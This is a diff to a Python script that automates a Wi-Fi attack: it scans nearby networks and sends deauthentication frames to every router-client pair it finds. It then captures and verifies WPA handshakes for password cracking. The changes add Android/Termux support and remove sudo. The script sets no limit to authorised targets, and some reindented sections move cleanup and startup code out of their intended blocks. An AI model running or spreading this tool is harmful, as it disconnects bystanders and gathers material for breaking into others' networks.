@@ -24,7 +24,20 @@ logging.basicConfig(
 
 MAC_REGEX = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
 
+def is_termux():
+	return "com.termux" in os.environ.get("PREFIX", "")
+
 def run_command(command, timeout=None, shell=True):
+    env = os.environ.copy()
+    if 'PREFIX' in env:
+        env['PATH'] = f"{env['PREFIX']}/bin:" + env['PATH']
+
+    if isinstance(command, str):
+        if is_termux():
+            command = command.strip()
+        else:
+            command = f"sudo {command.strip()}"
+
     try:
         result = subprocess.run(
             command,
@@ -33,7 +46,8 @@ def run_command(command, timeout=None, shell=True):
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
-            timeout=timeout
+            timeout=timeout,
+            env=env
         )
         return result.stdout
 
@@ -64,10 +78,10 @@ def package_installer():
         try:
             logging.info(f"{PINK}Installing Missing Packages: {missing_packages}")
 
-            run_command("sudo apt update")
+            run_command("apt update")
 
             for package in missing_packages:
-                run_command(f"sudo apt install {package} -y")
+                run_command(f"apt install {package} -y")
 
             logging.info(f"{GREEN}All Packages Were Installed Successfully.")
 
@@ -86,7 +100,7 @@ def mapping_interfaces():
     }
 
     try:
-        iw_output = run_command("sudo iw dev")
+        iw_output = run_command("iw dev")
 
         current_interface = None
 
@@ -104,7 +118,7 @@ def mapping_interfaces():
                 elif iface_type == "monitor" and not interfaces_info["monitor"]:
                     interfaces_info["monitor"] = current_interface
 
-        run_command("sudo ifconfig")
+        run_command("ifconfig")
 
         logging.info(
             f"{PINK}Interfaces Identified -> Managed: {RESET}"
@@ -120,19 +134,19 @@ def mapping_interfaces():
 
 def start(interfaces):
     target_plate = interfaces["managed"]
-    
+
     if not target_plate:
         logging.error(
             f"{CYAN}No Network Plates In 'managed' Mode "
             "Were Found To Initiate The Process."
         )
         return
-        
+
     monitor_plate = interfaces["monitor"]
     try:
         if not monitor_plate:
             logging.info(f"{PINK}Starting Monitor-Mode In Plate: {RESET}{CYAN}{target_plate}...")
-            run_command(f"sudo airmon-ng start {target_plate}")
+            run_command(f"airmon-ng start {target_plate}")
             interfaces = mapping_interfaces()
             monitor_plate = interfaces["monitor"]
             if not monitor_plate:
@@ -142,18 +156,18 @@ def start(interfaces):
                 )
         else:
             logging.info(f"{PINK}Plate: {RESET}{CYAN}{monitor_plate}{RESET}{PINK} Already In Monitor-Mode")
-            
+
         logging.info(f"{PINK}Enabling The Interface: {RESET}{CYAN}{monitor_plate}...")
-        run_command(f"sudo ifconfig {monitor_plate} up")
-        
+        run_command(f"ifconfig {monitor_plate} up")
+
         logging.info(f"{PINK}Checking If The Monitor Interface Is Active...")
-        ifconfig_check = run_command("sudo ifconfig")
+        ifconfig_check = run_command("ifconfig")
         if monitor_plate not in ifconfig_check:
             raise Exception(
                 f"The: {monitor_plate} Interface Was Not "
                 f"Found To Be Active On The System."
             )
-            
+
         logging.info(
             f"{PINK}Starting Temporary Scan With airodump-ng "
             f"On The Board: {RESET}{CYAN}{monitor_plate}..."
@@ -169,7 +183,7 @@ def start(interfaces):
             )
         except subprocess.TimeoutExpired:
             pass
-            
+
         time.sleep(2)
         csv_file = f"{cap_prefix}-01.csv"
         if os.path.exists(csv_file):
@@ -181,12 +195,12 @@ def start(interfaces):
                 "Or The File Was Not Generated."
             )
             return
-            
+
         logging.info(f"{PINK}Parsing 'airodump.txt' To Identify Targets BSSID And Clients...")
         targets = []
         with open("airodump.txt", "r", encoding="utf-8", errors="ignore") as f:
             lns = f.readlines()
-            
+
         reading_clients = False
         channels_routers = {}
         for ln in lns:
@@ -212,57 +226,57 @@ def start(interfaces):
                         "mac_client": mac_client,
                         "channel": channels_routers[mac_router]
                     })
-                    
+
         if not targets:
             logging.warning(f"{RED}No Active Router <-> Client Pair Was Found For Deauthentication.")
             return
-            
+
         logging.info(f"{GREEN}Found{RESET} {CYAN}{len(targets)}{RESET} {GREEN}Targets For Deauth.")
-        
+
         for idx, target in enumerate(targets):
             mac_rot = target["mac_router"]
             mac_cli = target["mac_client"]
             channel = target["channel"]
-            
+
             logging.info(
                 f"{PINK}Processing Target{RESET}{CYAN} {idx} {RESET}"
                 f"{PINK}[Router:{RESET} {CYAN}{mac_rot}{RESET}{PINK} | Client: {RESET}{CYAN}{mac_cli}{RESET}{PINK} | Channel:{RESET}{CYAN} {channel}]"
             )
-            
+
             logging.info(
                 f"{PINK}Deauthenticating ->{RESET} {CYAN}aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
             )
             run_command(
-                f"sudo aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
+                f"aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
             )
-            
+
             cap_file = f"package_{idx}"
             logging.info(
                 f"{PINK}Starting Dynamic Capture for Handshake: {RESET}{CYAN}{cap_file}.cap on Channel {channel}..."
             )
-            
+
             cmd_capture = (
-                f"sudo airodump-ng --bssid {mac_rot} --channel {channel} "
+                f"airodump-ng --bssid {mac_rot} --channel {channel} "
                 f"-w {cap_file} {monitor_plate}"
             )
-            
+
             proc_capture = subprocess.Popen(
                 cmd_capture,
                 shell=True,
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL
             )
-            
+
             handshake_captured = False
             max_wait_attempts = 60
             attempt = 0
-            
+
             file_to_check = f"{cap_file}-01.cap"
-            
+
             while attempt < max_wait_attempts:
                 time.sleep(1)
                 attempt += 1
-                
+
                 if os.path.exists(file_to_check):
                     check_cmd = f"aircrack-ng -b {mac_rot} {file_to_check}"
                     check_result = subprocess.run(
@@ -272,39 +286,47 @@ def start(interfaces):
                         stderr=subprocess.PIPE,
                         text=True
                     )
-                    
+
                     if "1 handshake" in check_result.stdout:
                         logging.info(f"{GREEN}[SUCCESS] 4-Way Handshake captured for BSSID {RESET}{CYAN}{mac_rot}!")
                         handshake_captured = True
                         break
-            
+
             proc_capture.terminate()
             try:
                 proc_capture.wait(timeout=2)
             except subprocess.TimeoutExpired:
                 proc_capture.kill()
-                
+
             if handshake_captured:
                 logging.info(f"{GREEN}Packet Capture {RESET}{CYAN}{cap_file}{RESET}{GREEN} Completed dynamically via EAPOL filter verification.")
             else:
                 logging.warning(f"{RED}Capture hit timeout limit without confirming a valid handshake for BSSID {RESET}{CYAN}{mac_rot}")
-                
+
     except Exception as e:
         logging.error(f"{RED}A Critical Failure Occurred During The Execution Of The Flow: {e}")
-        
+
     finally:
         logging.info(f"{GREEN}Interrupting Monitor Mode And Restoring Wi-Fi Network...")
-        try:
-            if monitor_plate:
-                run_command(f"sudo airmon-ng stop {monitor_plate}")
+    try:
+        if monitor_plate:
+            run_command(f"airmon-ng stop {monitor_plate}")
+
+        if not is_termux():
             try:
-                run_command("sudo systemctl restart NetworkManager")
+                run_command("systemctl restart NetworkManager")
             except Exception:
                 pass
-            run_command("sudo nmcli radio wifi on")
-            logging.info(f"{GREEN}Network interfaces restored and NetworkManager restarted successfully.")
-        except Exception as cleanup_error:
-            logging.error(f"{RED}Error while trying to restore default network services: {cleanup_error}")
+
+        run_command("nmcli radio wifi on")
+        logging.info(
+            f"{GREEN}Network interfaces restored and NetworkManager restarted successfully."
+        )
+
+    except Exception as cleanup_error:
+        logging.error(
+            f"{RED}Error while trying to restore default network services: {cleanup_error}"
+        )
 
 if __name__ == "__main__":
 
@@ -340,8 +362,9 @@ if __name__ == "__main__":
 {GREEN}#{RESET} {CYAN}===================================================================={RESET} {GREEN}#{RESET}
 """)
 
+if not is_termux():
     package_installer()
 
-    mapped_interfaces = mapping_interfaces()
+mapped_interfaces = mapping_interfaces()
 
-    start(mapped_interfaces)
+start(mapped_interfaces)
